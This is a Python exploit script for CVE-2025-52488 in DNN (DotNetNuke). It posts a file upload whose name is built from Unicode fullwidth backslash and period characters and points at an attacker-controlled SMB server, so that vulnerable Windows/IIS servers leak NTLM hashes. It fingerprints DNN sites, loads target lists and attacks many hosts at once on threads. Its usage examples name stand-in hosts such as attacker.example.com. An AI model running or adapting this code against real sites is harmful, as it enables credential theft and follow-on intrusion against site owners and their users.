#!/usr/bin/env python3
"""
DNN (DotNetNuke) Unicode Path Normalization NTLM Hash Disclosure Exploit (CVE-2025-52488)

Title: DNN Unicode Path Normalization NTLM Hash Disclosure
Date: 01/2025
CVE: CVE-2025-52488
Author: Security Research Team
Vendor Homepage: https://dnnsoftware.com/
Version: 6.0.0 to before 10.0.1
Tested on: Windows/IIS
"""

import requests
import urllib3
import string
import sys
import argparse
from datetime import datetime
import random
import threading
from typing import List
from colored import stylize, fg
from abc import ABC, abstractmethod
import pyfiglet
from urllib.parse import unquote

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Logger:
    """Enhanced logging utility with colored output"""
    
    @staticmethod
    def format_timestamp() -> str:
        """Format current timestamp for logging"""
        return f"[{datetime.now().strftime('%Y-%m-%d-%H:%M:%S')}]"
    
    @staticmethod
    def info(message: str, host: str = "") -> None:
        """Log info message"""
        host_info = f" [{host}]" if host else ""
        print(stylize(Logger.format_timestamp(), fg('#ffe900')) + 
              stylize(f" [INFO]{host_info} {message}", fg('blue')))
    
    @staticmethod
    def error(message: str, host: str = "") -> None:
        """Log error message"""
        host_info = f" [{host}]" if host else ""
        print(stylize(Logger.format_timestamp(), fg('#ffe900')) + 
              stylize(f" [ERROR]{host_info} {message}", fg('red')))
    
    @staticmethod
    def success(message: str, host: str = "") -> None:
        """Log success message"""
        host_info = f" [{host}]" if host else ""
        print(stylize(Logger.format_timestamp(), fg('#ffe900')) + 
              stylize(f" [SUCCESS]{host_info} {message}", fg('green')))
    
    @staticmethod
    def warning(message: str, host: str = "") -> None:
        """Log warning message"""
        host_info = f" [{host}]" if host else ""
        print(stylize(Logger.format_timestamp(), fg('#ffe900')) + 
              stylize(f" [WARNING]{host_info} {message}", fg('yellow')))


class Utils:
    """Utility functions for exploit framework"""
    
    @staticmethod
    def generate_random_string(length: int = 10) -> str:
        """Generate random string of specified length"""
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))
    
    @staticmethod
    def validate_url(url: str) -> str:
        """Validate and format URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')
    
    @staticmethod
    def encode_unicode_path(smb_server: str) -> str:
        """Encode SMB path using Unicode normalization for DNN exploit"""
        # Unicode fullwidth backslash (\uFF3C) encoded as UTF-8
        unicode_backslash = "%EF%BC%BC"
        # Unicode fullwidth period (\uFF0E) encoded as UTF-8  
        unicode_period = "%EF%BC%8E"
        
        # Craft the malicious filename with Unicode normalization
        payload = f"{unicode_backslash}{unicode_backslash}{smb_server}{unicode_backslash}{unicode_backslash}c${unicode_backslash}{unicode_backslash}an{unicode_period}jpg"
        return payload


class BaseExploit(ABC):
    """Base class for all exploits - provides common functionality"""
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = Utils.validate_url(target)
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        
    @abstractmethod
    def exploit(self, **kwargs) -> bool:
        """Main exploit method - must be implemented by subclasses"""
        pass
    
    @abstractmethod
    def check_vulnerability(self) -> bool:
        """Check if target is vulnerable - must be implemented by subclasses"""
        pass
    
    def get_default_headers(self) -> dict:
        """Get default headers for requests"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }


class DNNExploit(BaseExploit):
    """DNN Unicode Path Normalization NTLM Hash Disclosure Exploit (CVE-2025-52488)"""
    
    def __init__(self, target: str, timeout: int = 10):
        super().__init__(target, timeout)
        self.cve_id = "CVE-2025-52488"
        self.exploit_path = "/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx"
        self.dnn_indicators = [
            'dnn_IsMobile',
            'dotnetnuke',
            'dnnconnect',
            'DNN Platform',
            'DotNetNuke'
        ]
        
    def check_vulnerability(self) -> bool:
        """Check if target is vulnerable to CVE-2025-52488"""
        try:
            headers = self.get_default_headers()
            
            # Check if DNN is present by looking for common indicators
            response = self.session.get(self.target, headers=headers, timeout=self.timeout)
            
            # Check for DNN indicators in response
            dnn_found = False
            for indicator in self.dnn_indicators:
                if indicator.lower() in response.text.lower() or indicator.lower() in str(response.headers).lower():
                    dnn_found = True
                    Logger.info(f"DNN indicator found: {indicator}", self.target)
                    break
            
            if not dnn_found:
                Logger.warning("No DNN indicators found, target might not be DNN", self.target)
                return False
            
            # Check if file upload endpoint exists
            upload_url = f"{self.target}{self.exploit_path}?PortalID=0&storageFolderID=1&overrideFiles=false"
            test_response = self.session.get(upload_url, headers=headers, timeout=self.timeout)
            
            if test_response.status_code == 404:
                Logger.error("File upload endpoint not found", self.target)
                return False
            
            if test_response.status_code in [200, 405]:  # 405 Method Not Allowed is expected for GET
                Logger.success("File upload endpoint accessible", self.target)
                return True
                
            return False
            
        except requests.exceptions.RequestException as e:
            Logger.error(f"Request failed: {str(e)}", self.target)
            return False
        except Exception as e:
            Logger.error(f"Unexpected error: {str(e)}", self.target)
            return False
    
    def exploit(self, **kwargs) -> bool:
        """Execute NTLM hash disclosure exploit"""
        smb_server = kwargs.get('smb_server')
        if not smb_server:
            Logger.error("SMB server not provided", self.target)
            return False
            
        try:
            headers = self.get_default_headers()
            
            # Generate malicious filename using Unicode normalization
            malicious_filename = Utils.encode_unicode_path(smb_server)
            
            # Create multipart form data
            boundary = "----WebKitFormBoundary" + Utils.generate_random_string(12)
            headers['Content-Type'] = f'multipart/form-data; boundary={boundary}'
            
            # Random file content
            file_content = Utils.generate_random_string(50)
            
            # Construct multipart payload
            payload = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{unquote(malicious_filename)}"\r
Content-Type: image/jpeg\r
\r
{file_content}\r
--{boundary}--\r
"""
            
            upload_url = f"{self.target}{self.exploit_path}?PortalID=0&storageFolderID=1&overrideFiles=false"
            
            Logger.info(f"Attempting NTLM hash disclosure to: {smb_server}", self.target)
            Logger.info(f"Malicious filename: {unquote(malicious_filename)}", self.target)
            
            response = self.session.post(
                upload_url, 
                data=payload,
                headers=headers,
                timeout=self.timeout
            )
            
            if response.status_code in [200, 500]:
                Logger.success("Exploit payload sent successfully", self.target)
                Logger.info("Check your SMB server for incoming NTLM authentication attempts", self.target)
                
                # Check for error messages that might indicate success
                if any(error in response.text.lower() for error in ['runtime error', 'exception', 'error']):
                    Logger.success("Server error detected - possible successful exploitation", self.target)
                
                return True
            else:
                Logger.error(f"Exploit failed (HTTP {response.status_code})", self.target)
                return False
                
        except requests.exceptions.RequestException as e:
            Logger.error(f"Exploit failed: {str(e)}", self.target)
            return False
        except Exception as e:
            Logger.error(f"Unexpected error during exploit: {str(e)}", self.target)
            return False


class ExploitFramework:
    """Main framework for running exploits"""
    
    def __init__(self, cve_id: str = "CVE-XXXX-XXXX", exploit_type: str = "Generic Exploit"):
        self.cve_id = cve_id
        self.exploit_type = exploit_type
        self.banner = self._generate_banner()
    
    def _generate_banner(self) -> str:
        """Generate dynamic banner with CVE information using pyfiglet"""
        try:
            # Create ASCII art title
            title = pyfiglet.figlet_format("DNN EXPLOIT", font="slant")
            
            # Create info lines
            info_lines = [
                f"🎯 {self.cve_id} | {self.exploit_type}",
                "",
                "🔓 Unicode Path Normalization NTLM Hash Disclosure",
                "💀 Test First, Analyze After 💀",
                "",
                "Author: Security Research Team"
            ]
            
            # Calculate max width for border
            title_lines = title.split('\n')
            max_width = max(len(line) for line in title_lines + info_lines)
            border_width = max_width + 4
            
            # Build banner
            banner_lines = []
            banner_lines.append("╔" + "═" * border_width + "╗")
            banner_lines.append("║" + " " * border_width + "║")
            
            # Add title
            for line in title_lines:
                if line.strip():
                    padding = (border_width - len(line)) // 2
                    banner_lines.append("║" + " " * padding + line + " " * (border_width - len(line) - padding) + "║")
            
            banner_lines.append("║" + " " * border_width + "║")
            
            # Add info lines
            for line in info_lines:
                padding = (border_width - len(line)) // 2
                banner_lines.append("║" + " " * padding + line + " " * (border_width - len(line) - padding) + "║")
            
            banner_lines.append("║" + " " * border_width + "║")
            banner_lines.append("╚" + "═" * border_width + "╝")
            
            return "\n" + "\n".join(banner_lines) + "\n"
            
        except ImportError:
            # Fallback if pyfiglet is not available
            return f"""
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║                                 DNN EXPLOIT                                       ║
║                                                                                   ║
║                          🎯 {self.cve_id} | {self.exploit_type}                   ║
║                                                                                   ║
║                    🔓 Unicode Path Normalization NTLM Hash Disclosure            ║
║                              💀 Test First, Analyze After 💀                     ║
║                                                                                   ║
║                             Author: Security Research Team                        ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
        """
        
    def show_banner(self):
        """Display framework banner"""
        print(stylize(self.banner, fg('red')))
    
    def run_exploit_on_targets(self, targets: List[str], exploit_class, smb_server: str, threads: int = 10):
        """Run exploit on multiple targets with threading"""
        
        def worker(target: str):
            exploit = exploit_class(target)
            if exploit.check_vulnerability():
                exploit.exploit(smb_server=smb_server)
        
        # Limit concurrent threads
        semaphore = threading.Semaphore(threads)
        
        def threaded_worker(target: str):
            with semaphore:
                worker(target)
        
        threads_list = []
        for target in targets:
            thread = threading.Thread(target=threaded_worker, args=(target,))
            thread.start()
            threads_list.append(thread)
        
        # Wait for all threads to complete
        for thread in threads_list:
            thread.join()
    
    def load_targets_from_file(self, file_path: str) -> List[str]:
        """Load targets from file"""
        try:
            with open(file_path, 'r') as file:
                targets = [line.strip() for line in file if line.strip()]
            Logger.info(f"Loaded {len(targets)} targets from {file_path}")
            return targets
        except FileNotFoundError:
            Logger.error(f"Target file not found: {file_path}")
            return []
        except Exception as e:
            Logger.error(f"Error loading targets: {str(e)}")
            return []


def main():
    """Main function with improved argument parsing"""
    framework = ExploitFramework(
        cve_id="CVE-2025-52488",
        exploit_type="DNN NTLM Hash Disclosure"
    )
    framework.show_banner()
    
    parser = argparse.ArgumentParser(
        description="DNN Unicode Path Normalization NTLM Hash Disclosure Exploit (CVE-2025-52488)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py targets.txt attacker.example.com
  python main.py targets.txt 192.168.1.100 -t 20
  python main.py targets.txt attacker.burpcollaborator.net --timeout 15
        """
    )
    
    parser.add_argument('targets', help='Target file containing list of DNN hosts')
    parser.add_argument('smb_server', help='SMB server to capture NTLM hashes (e.g., attacker.com or IP)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    if len(sys.argv) < 3:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    # Load targets from file
    targets = framework.load_targets_from_file(args.targets)
    if not targets:
        Logger.error("No targets to process")
        sys.exit(1)
    
    # Run exploit
    Logger.info(f"Starting DNN NTLM hash disclosure exploit against {len(targets)} targets")
    Logger.info(f"SMB Server: {args.smb_server}")
    Logger.info(f"Threads: {args.threads}")
    Logger.warning("Ensure your SMB server is ready to capture NTLM hashes!")
    
    framework.run_exploit_on_targets(
        targets=targets,
        exploit_class=DNNExploit,
        smb_server=args.smb_server,
        threads=args.threads
    )
    
    Logger.info("Exploit execution completed")
    Logger.info("Check your SMB server logs for captured NTLM hashes")


if __name__ == '__main__':
    main()
